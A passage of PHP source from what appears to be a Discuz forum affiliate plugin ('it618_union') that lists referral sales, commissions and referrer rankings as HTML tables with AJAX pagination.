			$goodspic='source/plugin/it618_sale/images/logo.png';
			$goodsname=$it618_sale_money['it618_pname'];
			$gtypename=$it618_sale_money['it618_saleid'];
			$goodcount=$it618_sale_money['it618_count'];
			$saletime=$it618_sale_money['it618_time1'];
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_paotui'){
			$it618_paotui_sale=C::t('#it618_paotui#it618_paotui_sale')->fetch_by_id($it618_union_saletc['it618_saleid']);
			$goodsnametmp=str_replace("{name}",$union_paotui_name,$it618_union_lang['s994']);
			
			$goodspic='source/plugin/it618_union/images/paotui.png';
			$goodsname=$goodsnametmp;
			$gtypename='';
			$goodcount='';
			$saletime=$it618_paotui_sale['it618_time'];
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_witkey_post'){
			$it618_witkey_main=DB::fetch_first("SELECT * FROM ".DB::table('it618_witkey_main')." WHERE id=".$it618_union_saletc['it618_saleid']);
			
			$goodspic='source/plugin/it618_union/images/witkey.png';
			$goodsname=it618_union_witkey_rewriteurl('<a href="forum.php?mod=viewthread&tid='.$it618_witkey_main['it618_tid'].'" target="_blank">'.$it618_witkey_main['it618_title'].'</a>');
			$gtypename='';
			$goodcount='';
			$saletime=$it618_union_saletc['it618_time'];
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_witkey_get'){
			$it618_witkey_main=DB::fetch_first("SELECT * FROM ".DB::table('it618_witkey_main')." WHERE id=".$it618_union_saletc['it618_saleid']);
			
			$goodspic='source/plugin/it618_union/images/witkey.png';
			$goodsname=it618_union_witkey_rewriteurl('<a href="forum.php?mod=viewthread&tid='.$it618_witkey_main['it618_tid'].'" target="_blank">'.$it618_witkey_main['it618_title'].'</a>');
			$gtypename='';
			$goodcount='';
			$saletime=$it618_union_saletc['it618_time'];
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_wike_post'){
			$it618_wike_main=DB::fetch_first("SELECT * FROM ".DB::table('it618_wike_main')." WHERE id=".$it618_union_saletc['it618_saleid']);
			
			$goodspic='source/plugin/it618_union/images/wike.png';
			$goodsname=it618_union_wike_rewriteurl('<a href="forum.php?mod=viewthread&tid='.$it618_wike_main['it618_tid'].'" target="_blank">'.$it618_wike_main['it618_title'].'</a>');
			$gtypename='';
			$goodcount='';
			$saletime=$it618_union_saletc['it618_time'];
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_wike_get'){
			$it618_wike_main=DB::fetch_first("SELECT * FROM ".DB::table('it618_wike_main')." WHERE id=".$it618_union_saletc['it618_saleid']);
			
			$goodspic='source/plugin/it618_union/images/wike.png';
			$goodsname=it618_union_wike_rewriteurl('<a href="forum.php?mod=viewthread&tid='.$it618_wike_main['it618_tid'].'" target="_blank">'.$it618_wike_main['it618_title'].'</a>');
			$gtypename='';
			$goodcount='';
			$saletime=$it618_union_saletc['it618_time'];
		}
		
		if($it618_union_saletc['it618_saletype']=='it618_scoremall'){
			$it618_scoremall_sale = DB::fetch_first("SELECT * FROM ".DB::table('it618_scoremall_sale')." where id=".$it618_union_saletc['it618_saleid']);
			$it618_scoremall_goods = DB::fetch_first("SELECT * FROM ".DB::table('it618_scoremall_goods')." where id=".$it618_scoremall_sale['it618_pid']);
			
			$goodsurl=it618_union_getrewrite_plugin('it618_scoremall','product',$it618_scoremall_goods['id'],'plugin.php?id=it618_scoremall:scoremall_page&pid='.$it618_scoremall_goods['id']);
			
			$goodspic=it618_union_getgoodspic_plugin('it618_scoremall',$it618_scoremall_goods['it618_uid'],$it618_scoremall_goods['id'],$it618_scoremall_goods['it618_picbig']);
			$goodsname='<a href="'.$goodsurl.'" target="_blank">'.$it618_scoremall_goods['it618_name'].'</a>';
			$gtypename='';
			$goodcount='';
			$saletime=$it618_brand_sale['it618_time'];
		}
		
		$salemoneystr='';
		if($it618_union_saletc['it618_salemoney']>0){
			$salemoneystr=$it618_union_saletc['it618_salemoney'].' '.$it618_union_lang['s195'];
		}else{
			for($i=1;$i<=8;$i++){
				if($it618_union_saletc['it618_salecredit'.$i]>0)$salemoneystr.=$it618_union_saletc['it618_salecredit'.$i].' '.$_G['setting']['extcredits'][$i]['title'].' ';
			}
		}
		
		$tcmoneystr='';
		if($it618_union_saletc['it618_tcmoney']>0){
			$tcmoneystr=$it618_union_saletc['it618_tcmoney'].' '.$it618_union_lang['s195'];
		}else{
			for($i=1;$i<=8;$i++){
				if($_G['setting']['extcredits'][$i]['title']!=''&&$it618_union_saletc['it618_credit'.$i]>0){
					if($_GET['wap']==1){
						$tcmoneystr.=$it618_union_saletc['it618_credit'.$i].' '.$_G['setting']['extcredits'][$i]['title'].', ';
					}else{
						$tcmoneystr.=$it618_union_saletc['it618_credit'.$i].' '.$_G['setting']['extcredits'][$i]['title'].', ';
					}
				}
			}
			if($tcmoneystr!=''){
				$tcmoneystr=$tcmoneystr.'@';
				$tcmoneystr=str_replace(', @','',$tcmoneystr);
			}
		}
		
		if($it618_union_saletc['it618_type']==1){
			$tmpuser=$it618_union_lang['s990'].it618_union_getusername($it618_union_saletc['it618_saleuid']);
		}else{
			$tmpuser=$it618_union_lang['s991'].it618_union_getusername($it618_union_saletc['it618_tuiuidfind']);
		}

		if($_GET['wap']==1){
			$mysale_get.='<tr>
							<td class="tdleft"><img src="'.$goodspic.'"/></td>
							<td class="tdright">
								<div class="tdname">'.$goodsname.'</div>
								<div class="tddes"><font color=#999>'.$gtypename.' '.$goodcount.'</font> '.$salemoneystr.'</div>
								<div class="tddes">'.$tmpuser.'</div>
								<div class="tddes"><font color=#999>'.date('Y-m-d H:i:s', $it618_union_saletc['it618_time']).'</font></div>
								<div class="tdprice">'.$tcmoneystr.'</div>
							</td>
						  </tr>
						  <tr><td colspan="2" class="tdcolspan"></td></tr>';
		}else{
			
			$mysale_get.='<tr>
						<td>'.$it618_union_saletc['id'].'</td>
						<td width=480><div style="width:480px">
						<img src="'.$goodspic.'" width="38" height="38" style="float:left;margin-right:6px" align="absmiddle"/>
						<div style="width:410px;float:left;line-height:20px;text-align:left">'.$goodsname.'<br><font color=#999>'.$gtypename.' '.$goodcount.'</font> <font color=#390>'.$tmpuser.'</font>
						</div>
						</div></td>
						<td><font color=#f60>'.$salemoneystr.'</font></td>
						<td><font color=#f60>'.$tcmoneystr.'</font></td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $saletime).'</font></td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_union_saletc['it618_time']).'</font></td>
						</tr>';
		}
	}

	
	$funname='getmysale';
	$count=C::t('#it618_union#it618_union_saletc')->count_by_search($it618sql,'',$uid, $_GET['it618_time1'], $_GET['it618_time2']);
	$sum=C::t('#it618_union#it618_union_saletc')->sum_by_search($it618sql,'',$uid, $_GET['it618_time1'], $_GET['it618_time2']);
	
	$tcmoneystr='';
	if($sum['tcmoney']>0){
		$tcmoneystr=$sum['tcmoney'].' '.$it618_union_lang['s195'];
	}else{
		for($i=1;$i<=8;$i++){
			if($_G['setting']['extcredits'][$i]['title']!=''&&$sum['jf'.$i]>0){
				if($_GET['wap']==1){
					$tcmoneystr.=$sum['jf'.$i].' '.$_G['setting']['extcredits'][$i]['title'].', ';
				}else{
					$tcmoneystr.=$sum['jf'.$i].' '.$_G['setting']['extcredits'][$i]['title'].', ';
				}
			}
		}
		if($tcmoneystr!=''){
			$tcmoneystr=$tcmoneystr.'@';
			$tcmoneystr=str_replace(', @','',$tcmoneystr);
		}
	}
	
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_union:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s80'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_union_lang['s81'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s81'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo '<span style="float:right;color:red;font-size:12px">'.$tcmoneystr.'</span>'.$it618_union_lang['s92'].'<font color=red>'.$count.'</font>it618_split'.$mysale_get.'it618_split'.$multipage;

}


if($_GET['ac']=="getphlist"){
	$ppp=10;
	if($_GET['wap']==1)$ppp=15;
	
	$n=1;
	if($_GET['type']==0){
		$query = DB::query("SELECT * FROM ".DB::table('it618_union_reguser')." ORDER BY it618_time desc LIMIT 0,15");
	}
	if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
	if($_GET['type']==1){
		$tomonth = date('n'); 
		$todate = date('j'); 
		$toyear = date('Y');
		$time=mktime(0, 0, 0, $tomonth, $todate-7, $toyear);
		
		$query = DB::query("SELECT it618_tuiuid,count(1) as it618_count FROM ".DB::table('it618_union_reguser')." where it618_time>=$time GROUP BY it618_tuiuid ORDER BY it618_count desc LIMIT 0,".$ppp);
	}
	
	if($_GET['type']==2){
		$tomonth = date('n'); 
		$toyear = date('Y');
		$time=mktime(0, 0, 0, $tomonth, 1, $toyear);
		
		$query = DB::query("SELECT it618_tuiuid,count(1) as it618_count FROM ".DB::table('it618_union_reguser')." where it618_time>=$time GROUP BY it618_tuiuid ORDER BY it618_count desc LIMIT 0,".$ppp);
	}
	if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
	if($_GET['type']==3){
		$query = DB::query("SELECT it618_tuiuid,count(1) as it618_count FROM ".DB::table('it618_union_reguser')." GROUP BY it618_tuiuid ORDER BY it618_count desc LIMIT 0,".$ppp);
	}
	
	$n=1;
	while($getphlist_tmp = DB::fetch($query)) {
		if($_GET['type']==0){
			$username1=it618_union_getusername($getphlist_tmp['it618_uid']);
			$userurl1=it618_union_rewriteurl($getphlist_tmp['it618_uid']);
			$username2=it618_union_getusername($getphlist_tmp['it618_tuiuid']);
			$userurl2=it618_union_rewriteurl($getphlist_tmp['it618_tuiuid']);
		
			$conphstr.='<tr>
			<td>'.$username1.'</td>
			<td>'.$username2.'</td>
			<td><font color=#999>'.date('Y-m-d H:i:s', $getphlist_tmp['it618_time']).'</font></td>
			</tr>';
		}else{
			$username=it618_union_getusername($getphlist_tmp['it618_tuiuid']);
			$userurl=it618_union_rewriteurl($getphlist_tmp['it618_tuiuid']);
		
			$conphstr.='<tr>
			<td>'.$n.'</td>
			<td style="text-align:left">'.$username.'</td>
			<td><font color=red>'.$getphlist_tmp['it618_count'].'</font></td>
			</tr>';
		}
		
		$n=$n+1;
	}
	
	echo $conphstr;
}


if($_GET['ac']=="checkuid"){
	if($uid<=0){
		echo it618_union_getlang('s17');
	}else{
		$tmpstr='';
		$tmparr=explode("@",$_GET['uids']);
		for($i=0;$i<count($tmparr);$i++){
			if($tmparr[$i]>0){
				$username=it618_union_getusername($tmparr[$i]);
				if($username!=''){
					$tmpuidstr.=$tmparr[$i].',';
					$tmpunamestr.=$username.',';
				}
			}
		}
		if($tmpuidstr!='')$tmpuidstr.='it618split';
		$tmpuidstr=str_replace(',it618split','',$tmpuidstr);
		if($tmpunamestr!='')$tmpunamestr.='it618split';
		$tmpunamestr=str_replace(',it618split','',$tmpunamestr);
	}
	
	echo $tmpuidstr.'it618_split'.$tmpunamestr;
}


if($_GET['ac']=="unionshare_yq"){
	$ppp = 15;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$shoptype=$_GET['shoptype'];
	$pid=intval($_GET['pid']);
	$uid=$_G['uid'];
	
	$shoptypearray = array('video', 'exam', 'group', 'brand', 'tuan');
	$shoptype = !in_array($_GET['shoptype'], $shoptypearray) ? '' : $_GET['shoptype'];
	
	$it618sql="it618_saletype='it618_".$shoptype."' and it618_pid=".$pid;
	
	if($uid>0){
		
		foreach(C::t('#it618_union#it618_union_saletc')->fetch_all_by_search(
				$it618sql,'id desc',$uid, '', '',$startlimit,$ppp
		) as $it618_union_saletc) {
		
			if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		
			if($it618_union_saletc['it618_saletype']=='it618_video'){
				if($it618_video_sale = C::t('#it618_video#it618_video_sale')->fetch_by_id($it618_union_saletc['it618_saleid'])){
//					$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_sale['it618_pid']);
//					$goodspic=it618_union_getgoodspic_plugin('it618_video',$it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']);
//					
//					$goodsurl=it618_union_getrewrite_plugin('it618_video','video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
//					$goodsname='<a href="'.$goodsurl.'" target="_blank">'.$it618_video_goods['it618_name'].'</a>';
					
					if($it618_video_sale['it618_gtypeid']>0){
						$gtypename=C::t('#it618_video#it618_video_goods_type')->fetch_it618_name_by_id($it618_video_sale['it618_gtypeid']);
						$gtypename=str_replace("all",$it618_union_lang['s880'],$gtypename);
					}else{
						$gtypename=$it618_union_lang['s25'];
					}
					
					$goodcount=$it618_union_lang['s1890'].$it618_video_sale['it618_count'];
					
					$saletime=$it618_video_sale['it618_time'];
				}else{
					continue;
				}
			}
			
			if($it618_union_saletc['it618_saletype']=='it618_exam'){
				if($it618_exam_sale = C::t('#it618_exam#it618_exam_sale')->fetch_by_id($it618_union_saletc['it618_saleid'])){
//					$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_sale['it618_pid']);
//					$goodspic=it618_union_getgoodspic_plugin('it618_exam',$it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']);
//					
//					$goodsurl=it618_union_getrewrite_plugin('it618_exam','exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
//					$goodsname='<a href="'.$goodsurl.'" target="_blank">'.$it618_exam_goods['it618_name'].'</a>';
					
					if($it618_exam_sale['it618_gtypeid']>0){
						$gtypename=C::t('#it618_exam#it618_exam_goods_type')->fetch_it618_name_by_id($it618_exam_sale['it618_gtypeid']);
					}else{
						$gtypename=$it618_union_lang['s25'];
					}
					
					$goodcount=$it618_union_lang['s1890'].$it618_exam_sale['it618_count'];
					
					$saletime=$it618_exam_sale['it618_time'];
				}else{
					continue;
				}
			}
			
			if($it618_union_saletc['it618_saletype']=='it618_group'){
				
				if($it618_group_sale = C::t('#it618_group#it618_group_sale')->fetch_by_id($it618_union_saletc['it618_saleid'])){
//					$it618_group_goods = C::t('#it618_group#it618_group_goods')->fetch_by_id($it618_group_sale['it618_pid']);
//					$it618_group_group=C::t('#it618_group#it618_group_group')->fetch_by_groupid($it618_group_goods['it618_groupid']);
//					$grouptitle=DB::result_first("select grouptitle from ".DB::table('common_usergroup')." where groupid=".$it618_group_goods['it618_groupid']);
//					$it618_unit=it618_union_getvipgoodsunit($it618_group_goods);
//		
//					//$goodspic=it618_union_getgoodspic_plugin('it618_group',0,$it618_group_goods['id'],$it618_group_goods['it618_picbig']);
//					$goodspic=$it618_group_group['it618_ico'];
//					$goodsname=$grouptitle.' '.$it618_unit;
//					$goodsurl=it618_union_getrewrite_plugin('it618_group','group_product',$it618_group_goods['id'],'plugin.php?id=it618_group:product&pid='.$it618_group_goods['id']);
					
					if($it618_group_sale['it618_gtypeid']>0){
						$gtypename=C::t('#it618_group#it618_group_goods_type')->fetch_it618_name_by_id($it618_group_sale['it618_gtypeid']);
					}else{
						$gtypename=$it618_union_lang['s25'];
					}
					
					$goodcount=$it618_union_lang['s1890'].$it618_group_sale['it618_count'];
					
					$saletime=$it618_group_sale['it618_time'];
				}else{
					continue;
				}
			}
			
			if($it618_union_saletc['it618_saletype']=='it618_brand'){
				if($it618_brand_sale = C::t('#it618_brand#it618_brand_sale')->fetch_by_id($it618_union_saletc['it618_saleid'])){
//					$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_sale['it618_pid']);
//					$goodspic=it618_union_getgoodspic_plugin('it618_brand',$it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']);
//					
//					$goodsurl=it618_union_getrewrite_plugin('it618_brand','shop_product',$it618_brand_goods['it618_shopid'].'@'.$it618_brand_goods['id'],'plugin.php?id=it618_brand:product&sid='.$it618_brand_goods['it618_shopid'].'&pid='.$it618_brand_goods['id']);
//					$goodsname='<a href="'.$goodsurl.'" target="_blank">'.$it618_brand_goods['it618_name'].'</a>';
					
					if($it618_brand_sale['it618_gtypeid']>0){
						$gtypename=C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_name_by_id($it618_brand_sale['it618_gtypeid']);
					}
					
					$goodcount=$it618_union_lang['s1890'].$it618_brand_sale['it618_count'];
					
					$saletime=$it618_brand_sale['it618_time'];
				}else{
					continue;
				}
			}
			
			if($it618_union_saletc['it618_saletype']=='it618_tuan'){
				if($it618_tuan_sale = C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($it618_union_saletc['it618_saleid'])){
//					$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_sale['it618_pid']);
//					$goodspic=it618_union_getgoodspic_plugin('it618_tuan',$it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']);
//					
//					$goodsurl=it618_union_getrewrite_plugin('it618_tuan','tuan_product',$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:product&pid='.$it618_tuan_goods['id']);
//					$goodsname='<a href="'.$goodsurl.'" target="_blank">'.$it618_tuan_goods['it618_name'].'</a>';
					
					if($it618_tuan_sale['it618_gtypeid']>0){
						$gtypename=C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_sale['it618_gtypeid']);
					}
					
					$goodcount=$it618_union_lang['s1890'].$it618_tuan_sale['it618_count'];
					
					$saletime=$it618_tuan_sale['it618_time'];
				}else{
					continue;
				}
			}
			
			$salemoneystr='';
			if($it618_union_saletc['it618_salemoney']>0){
				$salemoneystr=$it618_union_saletc['it618_salemoney'].' '.$it618_union_lang['s195'];
			}else{
				for($i=1;$i<=8;$i++){
					if($it618_union_saletc['it618_salecredit'.$i]>0)$salemoneystr.=$it618_union_saletc['it618_salecredit'.$i].' '.$_G['setting']['extcredits'][$i]['title'].' ';
				}
			}
			
			$tcmoneystr='';
			if($it618_union_saletc['it618_tcmoney']>0){
				$tcmoneystr=$it618_union_saletc['it618_tcmoney'].' '.$it618_union_lang['s195'];
			}else{
				for($i=1;$i<=8;$i++){
					if($_G['setting']['extcredits'][$i]['title']!=''&&$it618_union_saletc['it618_credit'.$i]>0){
						if($_GET['wap']==1){
							$tcmoneystr.=$it618_union_saletc['it618_credit'.$i].' '.$_G['setting']['extcredits'][$i]['title'].', ';
						}else{
							$tcmoneystr.=$it618_union_saletc['it618_credit'.$i].' '.$_G['setting']['extcredits'][$i]['title'].', ';
						}
					}
				}
				if($tcmoneystr!=''){
					$tcmoneystr=$tcmoneystr.'@';
					$tcmoneystr=str_replace(', @','',$tcmoneystr);
				}
			}
			
			if($it618_union_saletc['it618_type']==1){
				$tmpuser=$it618_union_lang['s990'].it618_union_getusername($it618_union_saletc['it618_saleuid']);
			}else{
				$tmpuser=$it618_union_lang['s991'].it618_union_getusername($it618_union_saletc['it618_tuiuidfind']);
			}
		
			$mysale_get.='<tr>
							<td>
								<div class="tddes"><span style="float:right;color:#999">'.$tmpuser.'</span><font color=#666 style="font-size:12px">'.$gtypename.' '.$salemoneystr.'</font></div>
								<div class="tdprice"><span style="float:right;color:#999">'.date('Y-m-d H:i:s', $it618_union_saletc['it618_time']).'</span>'.$tcmoneystr.'</div>
							</td>
						  </tr>';
		}
	}
	
	$funname='getmysale';
	$count=C::t('#it618_union#it618_union_saletc')->count_by_search($it618sql,'',$uid, $_GET['it618_time1'], $_GET['it618_time2']);
	$sum=C::t('#it618_union#it618_union_saletc')->sum_by_search($it618sql,'',$uid, $_GET['it618_time1'], $_GET['it618_time2']);
	
	$tcmoneystr='';
	if($sum['tcmoney']>0){
		$tcmoneystr=$sum['tcmoney'].' '.$it618_union_lang['s195'];
	}else{
		for($i=1;$i<=8;$i++){
			if($_G['setting']['extcredits'][$i]['title']!=''&&$sum['jf'.$i]>0){
				if($_GET['wap']==1){
					$tcmoneystr.=$sum['jf'.$i].' '.$_G['setting']['extcredits'][$i]['title'].', ';
				}else{
					$tcmoneystr.=$sum['jf'.$i].' '.$_G['setting']['extcredits'][$i]['title'].', ';
				}
			}
		}
		if($tcmoneystr!=''){
			$tcmoneystr=$tcmoneystr.'@';
			$tcmoneystr=str_replace(', @','',$tcmoneystr);
		}
	}

	if($count<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($count/$ppp);
	}
	if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
		
		if($page==1){
			$pagepre='<a class="pagebtn btn-weak btn-disabled" >'.$it618_union_lang['s80'].'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=2";
				$pagenext='<a href="javascript:" class="pagebtn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
			}else{
				$pagenext='<a class="pagebtn btn-weak btn-disabled">'.$it618_union_lang['s81'].'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
			$pagepre='<a href="javascript:" class="pagebtn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page+1);
			$pagenext='<a href="javascript:" class="pagebtn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
			$pagepre='<a href="javascript:" class="pagebtn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
			$pagenext='<a class="pagebtn btn-weak btn-disabled" >'.$it618_union_lang['s81'].'</a>';
		}
		$multipage=$pagepre.' '.$curpage.' '.$pagenext;
	}
	
	$url_yqreg=it618_union_getrewrite('union_uc','yqreg','plugin.php?id=it618_union:union_uc&pagetype=yqreg');
	$url_saletc=it618_union_getrewrite('union_uc','saletc','plugin.php?id=it618_union:union_uc&pagetype=saletc');
	
	echo $url_saletc.'it618_split'.$url_yqreg.'it618_split<span style="float:right;color:red;font-size:12px">'.$tcmoneystr.'</span>'.$it618_union_lang['s92'].'<font color=red>'.$count.'</font>it618_split'.$mysale_get.'it618_split'.$multipage;
}
?>